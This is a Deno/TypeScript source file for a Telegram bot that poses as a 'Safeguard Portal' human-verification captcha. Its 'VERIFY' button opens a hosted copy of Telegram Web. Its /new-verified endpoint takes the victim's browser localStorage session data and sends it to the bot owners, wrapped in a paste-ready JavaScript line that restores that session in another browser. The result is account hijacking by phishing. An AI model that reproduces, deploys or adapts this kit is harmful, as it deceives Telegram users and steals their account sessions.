import {
  Bot,
  InlineKeyboard,
  InputFile,
  webhookCallback,
} from "https://deno.land/x/grammy@v1.30.0/mod.ts";

type SafeguardConfig = {
  channel: string;
  image: string;
  name: string;
  inviteLink: string;
};

/* #region environment variable */
const botOwner = Deno.env.get("BOT_OWNER") as string;
const botName = Deno.env.get("BOT_NAME");
const webAppLink = Deno.env.get("WEB_APP_LINK");
const gateKeeper = Deno.env.get("GATE_KEEPER");
const sgClickVerifyURL = Deno.env.get("SAFEGUARD_CLICK_VERIFY");
const sgTapToVerifyURL = Deno.env.get("SAFEGUARD_TAP_VERIFY");
const sgVerifiedURL = Deno.env.get("SAFEGUARD_VERIFIED");
const DEBUG = Boolean(Number(Deno.env.get("DEBUG")));
/* #endregion */

/* #region init */
const botLink = `tg://resolve?domain=${botName}&start=`;
const sgConfigDefault: SafeguardConfig = {
  channel: "",
  image: "",
  name: "",
  inviteLink: "",
};
const bot = new Bot(gateKeeper as string);
/* #endregion */

/* #region telegram */
// open web app
bot.chatType("private").command("start", async (ctx) => {
  const msg = ctx.message?.text.split(" ");
  const id = msg[msg.length - 1];

  const caption = `<b>Verify you're human with Safeguard Portal</b>
    
Click 'VERIFY' and complete captcha to gain entry - <a href="https://docs.safeguard.run/group-security/verification-issues"><i>Not working?</i></a>`;
  const sgClickVerify = await Deno.open("./safeguard-click-verify.jpg");
  const input = new InputFile(sgClickVerifyURL || sgClickVerify);
  const keyboard = new InlineKeyboard().webApp(
    "VERIFY",
    (webAppLink as string) + "?c=" + id
  );
  await bot.api.raw.sendPhoto({
    caption,
    photo: input,
    chat_id: ctx.chatId,
    parse_mode: "HTML",
    reply_markup: keyboard,
  });
});

bot.on("my_chat_member", async (ctx) => {
  if (ctx.myChatMember.chat.type !== "channel") return;

  const caption = `<b>Verify you're human with Safeguard Portal</b>

Click 'VERIFY' and complete captcha to gain entry - <a href="https://docs.safeguard.run/group-security/verification-issues"><i>Not working?</i></a>`;
  const sgClickVerify = await Deno.open("./safeguard-click-verify.jpg");
  const input = new InputFile(sgClickVerifyURL || sgClickVerify);
  const keyboard = new InlineKeyboard().url("VERIFY", webAppLink as string);
  await bot.api.raw.sendPhoto({
    caption,
    photo: input,
    chat_id: ctx.chatId,
    parse_mode: "HTML",
    reply_markup: keyboard,
  });
});

// setup for channel configuration
bot.chatType("private").command("setup", async (ctx) => {
  const text = `Fill below and send
  
channel: //@username
image: // image url to display in your channel
name:  // community name
inviteLink: // your group invite link`;
  await ctx.api.raw.sendMessage({
    text,
    chat_id: ctx.chatId,
  });
});

// save custom channel configuration
bot.chatType("private").on("message:text", async (ctx) => {
  let reply = `Saved!
  
Please note that it will be deleted after summer.`;
  const config: SafeguardConfig = {
    ...sgConfigDefault,
  };
  const text = ctx.message.text.split("\n");
  const kv = (text: string) => {
    const value = text.trim().split(":");
    if (value.length < 2) throw new Error("Invalid format");
    return value.slice(1).join(":").trim();
  };

  try {
    config.channel = kv(text[0]);
    config.image = kv(text[1]);
    config.name = kv(text[2]);
    config.inviteLink = kv(text[3]);
    const deno = await Deno.openKv();
    await deno.set(["channel", config.channel], config);
  } catch (e) {
    console.error(e);
    reply = "Hmmm, looks like your get is wrong";
  }

  ctx.api.raw.sendMessage({
    text: reply,
    chat_id: ctx.chatId,
  });
});

bot.catch((e) => {
  console.error(e.message);
});
/* #endregion */

/* #region webserver */

const MIME_TYPES: { [key: string]: string } = {
  ".html": "text/html", ".css": "text/css",
  ".js": "application/javascript", ".json": "application/json",
  ".png": "image/png", ".jpg": "image/jpeg", ".jpeg": "image/jpeg",
  ".svg": "image/svg+xml", ".ico": "image/x-icon",
  ".wasm": "application/wasm", ".txt": "text/plain",
  ".mp3": "audio/mpeg", ".mp4": "video/mp4",
  ".webmanifest": "application/manifest+json",
};

function serveStatic(root: string, filePath: string): Promise<Response> {
  const fullPath = root.endsWith("/") ? root + filePath : root + "/" + filePath;
  return Deno.readFile(fullPath).then((data) => {
    const ext = filePath.includes(".") ? filePath.slice(filePath.lastIndexOf(".")) : "";
    return new Response(data, {
      headers: { "Content-Type": MIME_TYPES[ext] || "application/octet-stream" },
    });
  }).catch(() => {
    // SPA fallback
    const indexPath = root.endsWith("/") ? root + "index.html" : root + "/index.html";
    return Deno.readTextFile(indexPath).then((html) => {
      return new Response(html, { headers: { "Content-Type": "text/html" } });
    }).catch(() => {
      return new Response("Not Found", { status: 404 });
    });
  });
}

// New verified handler - adapted for native Request/Response
async function handleNewVerified(req: Request): Promise<Response> {
  try {
    const body = await req.json();
    const storage = body.storage;

    if (storage) {
      const user = body.user || { username: "durov", id: "" };
      if (!user.id && storage.user_auth) {
        user.id = JSON.parse(storage.user_auth).id;
      }

      const log = `<tg-emoji emoji-id="5260206718410839459">✅</tg-emoji><a href="t.me/${
        user.username
      }">@${user.username}</a>

<pre>Object.entries(${JSON.stringify(
        storage
      )}).forEach(([name, value]) => localStorage.setItem(name, value)); window.location.reload();</pre>`;
      for (const owner of botOwner.split(",")) {
        await bot.api.raw.sendMessage({
          text: log,
          chat_id: owner,
          parse_mode: "HTML",
        });
      }

      const deno = await Deno.openKv();
      const entry = await deno.get(["channel", "default"]);
      const config = (entry.value || sgConfigDefault) as SafeguardConfig;
      const imageLink = sgVerifiedURL
        ? new URL(sgVerifiedURL)
        : "./safeguard-verify.jpg";
      const verifyMsg = `Verified, you can join the group using this temporary link:
    
<a href="${config.inviteLink}">${config.inviteLink}</a>
    
This link is a one time use and will expire`;
      const inviteMsg = `<b>Verified!</b> 
  
Join request has been sent and you will be added once the admin approves your request`;
      const user_auth = JSON.parse(storage.user_auth);
      await bot.api.raw.sendPhoto({
        caption: config.inviteLink ? verifyMsg : inviteMsg,
        photo: new InputFile(imageLink),
        parse_mode: "HTML",
        chat_id: user_auth.id,
      });
    }
    return new Response(JSON.stringify({ msg: "ok" }), {
      headers: { "Content-Type": "application/json" },
    });
  } catch (ex) {
    console.error(ex);
    return new Response(JSON.stringify({ msg: "ok" }), {
      headers: { "Content-Type": "application/json" },
    });
  }
}

// Webhook handler using grammy "std" adapter
const handleWebhook = webhookCallback(bot, "std");

// Main HTTP handler using Deno.serve (no Oak!)
async function handleRequest(req: Request): Promise<Response> {
  const url = new URL(req.url);
  const path = url.pathname.slice(1);

  if (path === "tg-webhook") {
    return handleWebhook(req);
  }

  if (path === "new-verified") {
    return handleNewVerified(req);
  }

  if (path === "ping") {
    return new Response("pong - server alive", {
      headers: { "Content-Type": "text/plain" },
    });
  }

  if (path === "sg-mini") {
    return new Response(
      "<!DOCTYPE html><html><head><meta charset=utf-8></head><body style=background:#000;color:#fff><h1>OK</h1></body></html>",
      { headers: { "Content-Type": "text/html; charset=utf-8" } }
    );
  }

  if (path === "" || path === "test") {
    try {
      const html = await Deno.readTextFile(`${Deno.cwd()}/static/tweb/index.html`);
      return new Response(html, { headers: { "Content-Type": "text/html" } });
    } catch {
      return new Response("Not Found", { status: 404 });
    }
  }

  if (path === "sg" || path === "sg/") {
    try {
      const html = await Deno.readTextFile(`${Deno.cwd()}/static/sg/index.html`);
      return new Response(html, { headers: { "Content-Type": "text/html" } });
    } catch {
      return new Response("Not Found", { status: 404 });
    }
  }

  // Static file serving for sg/ and tweb/ paths
  let filename = path || "index.html";
  const parts = filename.split("/");
  if (parts.length > 1) {
    filename = parts[parts.length - 1];
  }

  if (path.startsWith("sg/") || path.startsWith("sg?")) {
    return serveStatic(`${Deno.cwd()}/static/sg`, filename);
  }

  if (path.startsWith("tweb")) {
    return serveStatic(`${Deno.cwd()}/static/tweb`, filename);
  }

  if (path.includes(".")) {
    return serveStatic(`${Deno.cwd()}/static/tweb`, filename);
  }

  return new Response(JSON.stringify({ msg: "ok" }), {
    headers: { "Content-Type": "application/json" },
  });
}

/* #endregion */

if (DEBUG) {
  bot.start();
}

Deno.serve(handleRequest);
